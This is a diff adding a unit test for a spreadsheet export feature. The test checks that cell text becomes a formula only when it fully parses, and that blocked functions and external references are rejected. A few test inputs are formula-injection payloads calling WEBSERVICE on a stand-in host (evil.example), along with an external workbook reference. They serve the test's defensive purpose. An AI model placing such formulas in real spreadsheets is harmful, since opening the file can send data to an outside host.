@@ -224,6 +224,29 @@ describe('make_file', () => {
     const ws = XLSX.read(fs.readFileSync(path.join(A.team, 'users/alice/out/text.xlsx'))).Sheets.Sheet1!
     expect([ws.B2.v, ws.B2.f, ws.B3.v, ws.B3.f]).toEqual(['=> done', undefined, '= see note', undefined])
   })
+  test('xlsx: a cell is a formula only when the whole formula parses (re-review)', async () => {
+    // text that starts like a formula but does not parse as a whole stays text
+    const text = ['=3 days', '= 5 stars', '=1 apple', '=2x', '=> done', '= see note', '=A1 total', '=SUM(A1) x', '=Total+1', '="a" "b"', '=3 days(']
+    for (const t of text) expect(cellValue(t), t).toBe(t)
+    expect(cellValue('=SUM(A1:A3)')).toEqual({ formula: 'SUM(A1:A3)' })
+    expect(cellValue('=A1*2')).toEqual({ formula: 'A1*2' })
+    expect(cellValue('=IF(A1>1,"y","n")')).toEqual({ formula: 'IF(A1>1,"y","n")' })
+    expect(cellValue("='Q1 data'!B2+1")).toEqual({ formula: "'Q1 data'!B2+1" })
+    expect(cellValue('=SUM($1:$3)+10%')).toEqual({ formula: 'SUM($1:$3)+10%' })
+    expect(cellValue('=IFERROR(1/0,#N/A)')).toEqual({ formula: 'IFERROR(1/0,#N/A)' })
+    expect(cellValue('=SUM({1,2;3,4})*1.5e2')).toEqual({ formula: 'SUM({1,2;3,4})*1.5e2' })
+    // the blocked-function and external-reference rules still refuse the cell, also when the rest does not parse
+    expect(cellValue('=1 apple&WEBSERVICE("http://evil.example/")')).toHaveProperty('error')
+    expect(cellValue('=webservice ("http://evil.example/")')).toBe('=webservice ("http://evil.example/")')
+    expect(cellValue('=SUM(1 x,webservice ("http://evil.example/"))')).toHaveProperty('error')
+    expect(cellValue('=[1]S!A1 x')).toHaveProperty('error')
+    const csv = 'a,b\n' + text.slice(0, 4).map((t, i) => `${i},${t}`).join('\n') + '\n9,=SUM(A2:A5)\n'
+    const r = await call('alice', null, 'make_file', { content: csv, format: 'xlsx', output: 'users/alice/out/parse.xlsx' })
+    expect(r.isError, r.text).toBe(false)
+    const ws = XLSX.read(fs.readFileSync(path.join(A.team, 'users/alice/out/parse.xlsx')), { sheetStubs: true }).Sheets.Sheet1!
+    expect([2, 3, 4, 5].map((n) => [ws[`B${n}`].v, ws[`B${n}`].f])).toEqual(text.slice(0, 4).map((t) => [t, undefined]))
+    expect(ws.B6?.f).toBe('SUM(A2:A5)')
+  })
   test('source file and team images (only readable ones) work; an existing file gets a conflict copy unless read this turn', async () => {
     const png = path.join(A.data, 'p.png')
     const ff = which('ffmpeg')
